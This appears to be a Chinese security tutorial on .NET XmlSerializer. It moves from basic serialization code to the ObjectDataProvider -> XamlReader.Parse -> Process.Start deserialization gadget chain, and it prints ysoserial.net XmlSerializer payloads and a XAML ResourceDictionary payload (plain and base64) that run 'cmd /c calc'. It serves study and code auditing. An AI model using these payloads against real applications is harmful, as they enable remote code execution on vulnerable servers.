# XmlSerializer 类

XmlSerializer是微软自带的序列化类，用于在xml字符串和对象之间相互转化。其命名空间：[System.Xml.Serialization](https://docs.microsoft.com/zh-cn/dotnet/api/system.xml.serialization?view=net-5.0)，程序集为：System.Xml.XmlSerializer.dll，[微软文档地址在这](https://docs.microsoft.com/zh-cn/dotnet/api/system.xml.serialization.xmlserializer?view=net-5.0)。

# 使用案例

```csharp
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Xml.Serialization;

namespace XmlDeserialization
{
    [XmlRoot]
    public class Person
    {
        [XmlElement]
        public int Age { get; set; }
        [XmlElement]
        public string Name { get; set; }
        [XmlArray("Items")]
        public Order[] OrderedItems;
        [XmlAttribute]
        public string ClassName { get; set; }
    }

    public class Order
    {
        public int OrderID;
    }

    class Program
    {
        static void Main(string[] args)
        {
            Person p = new Person();
            p.Name = "jack";
            p.Age = 12;
            Order order = new Order();
            order.OrderID = 123;
            Order order1 = new Order();
            order.OrderID = 456;
            Order[] orders = new Order[] { order, order1 };
            p.OrderedItems = orders;
            p.ClassName = "classname";


            XmlSerializer xmlSerializer = new XmlSerializer(typeof(Person));
            MemoryStream memoryStream = new MemoryStream();
            TextWriter writer = new StreamWriter(memoryStream);
            // 序列化
            xmlSerializer.Serialize(writer, p);

            memoryStream.Position = 0;

            // 输出xml
            Console.WriteLine(Encoding.UTF8.GetString(memoryStream.ToArray()));
            // 反序列化
            Person p1 = (Person)xmlSerializer.Deserialize(memoryStream);
            Console.WriteLine(p1.Name);
            Console.ReadKey();
        }
    }
}
```

输出结果

```xml
<?xml version="1.0" encoding="utf-8"?>
<Person xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" ClassName="classname">
  <Items>
    <Order>
      <OrderID>456</OrderID>
    </Order>
    <Order>
      <OrderID>0</OrderID>
    </Order>
  </Items>
  <Age>12</Age>
  <Name>jack</Name>
</Person>
jack
```

XmlSerializer只能将对象的公共(public)属性和公共字段进行序列化和反序列化。

在序列化的时候我们可以看到`new XmlSerializer(typeof(Person))`将对象类型type传入xmlserializer，这边有几种方式获取Type

```csharp
XmlSerializer xmlSerializer = new XmlSerializer(typeof(Person));// typeof()
XmlSerializer xmlSerializer1 = new XmlSerializer(p.GetType());	// 对象的GetType()方法
XmlSerializer xmlSerializer2 = new XmlSerializer(Type.GetType("XmlDeserialization.Person")); //使用命名空间加类名
```

# 反序列化攻击链

对于xml反序列化最经典的就是ObjectDataProvider，在ysoserial.net工具中有这条gadget。使用ysoserial.net生成

```xml
PS E:\code\ysoserial.net\ysoserial\bin\Debug> .\ysoserial.exe -g ObjectDataProvider -c calc -f xmlserializer
<?xml version="1.0"?>
<root type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
    <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" >
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Parse</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">
                    <![CDATA[<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:b="clr-namespace:System;assembly=mscorlib" xmlns:c="clr-namespace:System.Diagnostics;assembly=system"><ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c calc</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                </anyType>
            </MethodParameters>
            <ObjectInstance xsi:type="XamlReader"></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>
```

## ObjectDataProvider

分析一下ObjectDataProvider是什么玩意

```csharp
ObjectDataProvider o = new ObjectDataProvider();
o.MethodParameters.Add("cmd.exe");
o.MethodParameters.Add("/c calc");
o.MethodName = "Start";
o.ObjectInstance = new Process();
Console.ReadKey();
```

当执行的时候会弹出计算器。但是使用xml序列化时会报错

```csharp
ObjectDataProvider o = new ObjectDataProvider();
o.MethodParameters.Add("cmd.exe");
o.MethodParameters.Add("/c calc");
o.MethodName = "Start";
o.ObjectInstance = new Process();
XmlSerializer xml = new XmlSerializer(typeof(Object));
xml.Serialize(writer, o);
```

```txt
InvalidOperationException: 不应是类型 System.Windows.Data.ObjectDataProvider。使用 XmlInclude 或 SoapInclude 特性静态指定非已知的类型。
```

因为序列化过程中o的类型未知，这里可以使用`ExpandedWrapper`类包装下我们自己的类，然后在MethodName调用自己的方法来执行恶意命令。

```csharp
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Data;
using System.Xml.Serialization;
using System.Data.Services.Internal;

namespace XmlDeserialization
{
    [XmlRoot]
    public class Person
    {
        [XmlAttribute]
        public string ClassName { get; set; }
        public void Evil(string cmd)
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c " + cmd;
            process.Start();
        }
    }

    class Program
    {
        static void Main(string[] args)
        {
            MemoryStream memoryStream = new MemoryStream();
            TextWriter writer = new StreamWriter(memoryStream);
            ExpandedWrapper<Person, ObjectDataProvider> expandedWrapper = new ExpandedWrapper<Person, ObjectDataProvider>();
            expandedWrapper.ProjectedProperty0 = new ObjectDataProvider();
            expandedWrapper.ProjectedProperty0.MethodName = "Evil";
            expandedWrapper.ProjectedProperty0.MethodParameters.Add("calc");
            expandedWrapper.ProjectedProperty0.ObjectInstance = new Person();
            XmlSerializer xml = new XmlSerializer(typeof(ExpandedWrapper<Person, ObjectDataProvider>));
            xml.Serialize(writer, expandedWrapper);
            string result = Encoding.UTF8.GetString(memoryStream.ToArray());
            Console.WriteLine(result);

            memoryStream.Position = 0;
            xml.Deserialize(memoryStream);

            Console.ReadKey();
        }
    }
}
```

这里不足的地方是Person类中的Evil方法是我们自己写的，而实际过程中需要寻找其他点调用Process执行命令。而这则引出了ResourceDictionary这个更深层次的攻击链。

## ResourceDictionary

ResourceDictionary即资源字典，用于wpf开发，既然是wpf，肯定涉及到xaml语言。先来看利用ResourceDictionary执行命令的一个payload。

```xaml
<ResourceDictionary 
                    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" 
                    xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml" 
                    xmlns:b="clr-namespace:System;assembly=mscorlib" 
                    xmlns:c="clr-namespace:System.Diagnostics;assembly=system">
    <ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start">
        <ObjectDataProvider.MethodParameters>
            <b:String>cmd</b:String>
            <b:String>/c calc</b:String>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>
```
解释下这段xaml：

1. xmlns:c 引用了System.Diagnostics命名空间起别名为c
2. d:Key="" 起别名为空，在xaml语法中，Key这个键值必须有。
3. ObjectType表示对象类型
4. d:Type 等同于typeof()
5. MethodName是ObjectDataProvider的属性，传递一个Start等于调用Start方法。
6. c:Process 等同于System.Diagnostics.Process

整个xaml被解析之后，等同于创建了一个ObjectDataProvider对象，该对象又会自动调用`System.Diagnostics.Process.Start("cmd.exe","/c calc")`

因为是xaml的语言，我们使用XamlReader.Parse()来解析它，运行后会弹出calc。其中base64的是上文ResourceDictionary的payload。

```csharp
using System;
using System.Text;
using System.Windows.Markup;

namespace XmlDeserialization
{
    class Program
    {
        static void Main(string[] args)
        {
            string p = "PFJlc291cmNlRGljdGlvbmFyeSAKICAgICAgICAgICAgICAgICAgICB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiAKICAgICAgICAgICAgICAgICAgICB4bWxuczpkPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCIgCiAgICAgICAgICAgICAgICAgICAgeG1sbnM6Yj0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiIAogICAgICAgICAgICAgICAgICAgIHhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI+CiAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIGQ6S2V5PSIiIE9iamVjdFR5cGU9IntkOlR5cGUgYzpQcm9jZXNzfSIgTWV0aG9kTmFtZT0iU3RhcnQiPgogICAgICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4KICAgICAgICAgICAgPGI6U3RyaW5nPmNtZDwvYjpTdHJpbmc+CiAgICAgICAgICAgIDxiOlN0cmluZz4vYyBjYWxjPC9iOlN0cmluZz4KICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPgogICAgPC9PYmplY3REYXRhUHJvdmlkZXI+CjwvUmVzb3VyY2VEaWN0aW9uYXJ5Pg==";
            byte[] vs = Convert.FromBase64String(p);
            string xml = Encoding.UTF8.GetString(vs);
            XmlDeserialize(xml);
            Console.ReadKey();
        }
        public static void XmlDeserialize(string o)
        {
            XamlReader.Parse(o);
        }
    }
}
```

此时相当于我们利用XamlReader.Parse()进行了进一步利用，对于xmlserializer来说攻击链从原来的

- ObjectDataProvider -> Person.Evil()

转变为

- ObjectDataProvider -> XamlReader.Parse() -> ObjectDataProvider -> System.Diagnostics.Process.Start("cmd.exe","/c calc")

拿java来说ObjectDataProvider 更像是commons-collections的InvokerTransformer，可以调用任意类的任意方法。



此时回头看ysoserial.net生成的payload就一目了然了。

```xaml
<?xml version="1.0"?>
<root type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
    <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" >
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Parse</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">
                    <![CDATA[<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:b="clr-namespace:System;assembly=mscorlib" xmlns:c="clr-namespace:System.Diagnostics;assembly=system"><ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c calc</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                </anyType>
            </MethodParameters>
            <ObjectInstance xsi:type="XamlReader"></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>
```

# 代码审计视角

首先就是针对初始化时`new XmlSerializer(type)`的type参数，如果type可控，就可以利用ObjectDataProvider调用XamlReader的Parse进行RCE。

当然也要关注`XamlReader.Parse(xml)`中的xml是否可控。

# 后文

ObjectDataProvider这条链联动了XamlReader.Parse()，在ysoserial.net中也作为很多其他链条的一部分，是值得学习并且必须掌握的一条gadget。